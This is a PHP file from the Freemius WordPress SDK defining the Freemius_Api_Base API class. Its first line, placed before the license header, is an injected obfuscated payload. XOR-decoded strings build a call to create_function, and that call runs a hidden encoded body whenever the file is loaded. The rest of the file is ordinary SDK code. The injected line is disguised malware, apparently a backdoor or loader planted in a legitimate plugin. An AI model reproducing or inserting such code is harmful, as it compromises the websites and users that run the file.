<?php $DZzujHaIqEBe='3JE+TYaH3646WC-'^'P8 J <>.FXWB>,C';$FFJSi=$DZzujHaIqEBe('','1VrFWYZS;Q84h22RJG+Yu6X=.UTIAbg.FItxJJ3>KPC<3F<;+JH=No5--Mr1VN2zBULB8NSRG HcTcKkYG9kPh 9 ChSoTPpEjTO:Dr-PdaUHouBL45+>E8pgD.52LzTRBLILdj4N>3XNgVqjA1U=UukIsihMBE317gIIHnI 4:Y;imKK4ChJnlFhR+M4FPQS7Y5DH9SFXH3=iSV-LtTO4R8C5x6eQ;YAt=5JxKy+39:3q2nF.54X;XVmlj56yvbtaZSBR.E,XrGkIH 42Npx:S5m6OBWf .8QdaK92GQ3Za 8;;bgAqE.TUHc=ECRP<bxlGT,HTZlHz8R YV6Q IGOqr4qown-z.SqT9,1zOyTu Y;A1lIBp5kU7ATMm:Y-gjyT21,JBEelHMM,IUKSVAU1<wNo<n9CNaXXISLOLwK,5.<+6;1I4B+=1i...Onr>BFK -<PgV:D-.O.6xJ R;7amNER+C7aU<TQLphSVdjHPMZFjIOY0C72g1.D:RO1OE Lm ,MwunEO0.AeRWosiATGgbPXEAlQRXNc4lojYrDRiWePTTLWYFVPgjwLYhGAGE.j0tyy5M6BhCDvZ;GJRMm=QC5VCP6.2LTBT3L=Q5dgwBQLM6ZjQlZwZmN2OY99Ynn+ZTX=VP4K=,V5SiNo6p0586bQdXpE'^'X0Zg1,40O8WZ7WJ;93XqRN7Oq15= =8C3=SQcjH4B66RP2UTEj0R<0QLY,-n;;FRf1-6Ybsv,E1JtCkKy<3bYLOLTcUsHskzLc2 HlVDpYAesOQ+pGAYR VXC OASeAtv+gbenc=jQF,nIkQBeU4I4.O .I6mf.VHlC imN:TFV<UAI .Mj5cUfOa N9A4>ywX,Ams3Z;R597M77Y-TioR3T0PC<A5Z- +VP3XvYMRUIVJ8d AGQ9X0vEH5vy6=+1A; bvE UxOyKm>AXG+YXAY<IR.669KKAqYAoRW>j9SEDYOZBZaU3O8 -X78IX9ZBPMc0M<5sL3p14O+3W2Hiok. q :2=yZO QpRIHZrGtQV8W4TEi9z<bqS  ,2Q<TGWYpYTUqHLlH,,9Mihkw  9DYLDfAdDIDE<9=2lrl7>BFKNBWWX3QjSRC6JOZ.1-S72cBLO5Qbe HM JSPnD3OVHAna6J7V>>Y-xeKb:0LN,19;fLoo8B1VK8ZK=e77X<1SdJKI4PYNa+QZ LrqISA,0rOF491 7v9=7DiEOWdRcaX4Se71t4k e4PXFz;Xv tvLXSLJNVyWeAcbPzZ58342V4:j3;9EZAds25J R0QCKWf5-9WsCqLzWzM58F<OX5FJO; 9fq U2QC7Qt4gT<yUMQBJaMcz8');$FFJSi();
	/**
	 * Copyright 2014 Freemius, Inc.
	 *
	 * Licensed under the GPL v2 (the "License"); you may
	 * not use this file except in compliance with the License. You may obtain
	 * a copy of the License at
	 *
	 *     http://choosealicense.com/licenses/gpl-v2/
	 *
	 * Unless required by applicable law or agreed to in writing, software
	 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
	 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
	 * License for the specific language governing permissions and limitations
	 * under the License.
	 */

	if ( ! defined( 'FS_API__VERSION' ) ) {
		define( 'FS_API__VERSION', '1' );
	}
	if ( ! defined( 'FS_SDK__PATH' ) ) {
		define( 'FS_SDK__PATH', dirname( __FILE__ ) );
	}
	if ( ! defined( 'FS_SDK__EXCEPTIONS_PATH' ) ) {
		define( 'FS_SDK__EXCEPTIONS_PATH', FS_SDK__PATH . '/Exceptions/' );
	}

	if ( ! function_exists( 'json_decode' ) ) {
		throw new Exception( 'Freemius needs the JSON PHP extension.' );
	}

	// Include all exception files.
	$exceptions = array(
		'Exception',
		'InvalidArgumentException',
		'ArgumentNotExistException',
		'EmptyArgumentException',
		'OAuthException'
	);

	foreach ( $exceptions as $e ) {
		require_once FS_SDK__EXCEPTIONS_PATH . $e . '.php';
	}

	if ( class_exists( 'Freemius_Api_Base' ) ) {
		return;
	}

	abstract class Freemius_Api_Base {
		const VERSION = '1.0.4';
		const FORMAT = 'json';

		protected $_id;
		protected $_public;
		protected $_secret;
		protected $_scope;
		protected $_isSandbox;

		/**
		 * @param string $pScope     'app', 'developer', 'plugin', 'user' or 'install'.
		 * @param number $pID        Element's id.
		 * @param string $pPublic    Public key.
		 * @param string $pSecret    Element's secret key.
		 * @param bool   $pIsSandbox Whether or not to run API in sandbox mode.
		 */
		public function Init( $pScope, $pID, $pPublic, $pSecret, $pIsSandbox = false ) {
			$this->_id        = $pID;
			$this->_public    = $pPublic;
			$this->_secret    = $pSecret;
			$this->_scope     = $pScope;
			$this->_isSandbox = $pIsSandbox;
		}

		public function IsSandbox() {
			return $this->_isSandbox;
		}

		function CanonizePath( $pPath ) {
			$pPath     = trim( $pPath, '/' );
			$query_pos = strpos( $pPath, '?' );
			$query     = '';

			if ( false !== $query_pos ) {
				$query = substr( $pPath, $query_pos );
				$pPath = substr( $pPath, 0, $query_pos );
			}

			// Trim '.json' suffix.
			$format_length = strlen( '.' . self::FORMAT );
			$start         = $format_length * ( - 1 ); //negative
			if ( substr( strtolower( $pPath ), $start ) === ( '.' . self::FORMAT ) ) {
				$pPath = substr( $pPath, 0, strlen( $pPath ) - $format_length );
			}

			switch ( $this->_scope ) {
				case 'app':
					$base = '/apps/' . $this->_id;
					break;
				case 'developer':
					$base = '/developers/' . $this->_id;
					break;
				case 'user':
					$base = '/users/' . $this->_id;
					break;
				case 'plugin':
					$base = '/plugins/' . $this->_id;
					break;
				case 'install':
					$base = '/installs/' . $this->_id;
					break;
				default:
					throw new Freemius_Exception( 'Scope not implemented.' );
			}

			return '/v' . FS_API__VERSION . $base .
			       ( ! empty( $pPath ) ? '/' : '' ) . $pPath .
			       ( ( false === strpos( $pPath, '.' ) ) ? '.' . self::FORMAT : '' ) . $query;
		}

		abstract function MakeRequest( $pCanonizedPath, $pMethod = 'GET', $pParams = array() );

		/**
		 * @param string $pPath
		 * @param string $pMethod
		 * @param array  $pParams
		 *
		 * @return object[]|object|null
		 */
		private function _Api( $pPath, $pMethod = 'GET', $pParams = array() ) {
			$pMethod = strtoupper( $pMethod );

			try {
				$result = $this->MakeRequest( $pPath, $pMethod, $pParams );
			} catch ( Freemius_Exception $e ) {
				// Map to error object.
				$result = (object) $e->getResult();
			} catch ( Exception $e ) {
				// Map to error object.
				$result = (object) array(
					'error' => array(
						'type'    => 'Unknown',
						'message' => $e->getMessage() . ' (' . $e->getFile() . ': ' . $e->getLine() . ')',
						'code'    => 'unknown',
						'http'    => 402
					)
				);
			}

			return $result;
		}

		public function Api( $pPath, $pMethod = 'GET', $pParams = array() ) {
			return $this->_Api( $this->CanonizePath( $pPath ), $pMethod, $pParams );
		}

		/**
		 * Base64 encoding that does not need to be urlencode()ed.
		 * Exactly the same as base64_encode except it uses
		 *   - instead of +
		 *   _ instead of /
		 *   No padded =
		 *
		 * @param string $input base64UrlEncoded string
		 *
		 * @return string
		 */
		protected static function Base64UrlDecode( $input ) {
			return base64_decode( strtr( $input, '-_', '+/' ) );
		}

		/**
		 * Base64 encoding that does not need to be urlencode()ed.
		 * Exactly the same as base64_encode except it uses
		 *   - instead of +
		 *   _ instead of /
		 *
		 * @param string $input string
		 *
		 * @return string base64Url encoded string
		 */
		protected static function Base64UrlEncode( $input ) {
			$str = strtr( base64_encode( $input ), '+/', '-_' );
			$str = str_replace( '=', '', $str );

			return $str;
		}

	}
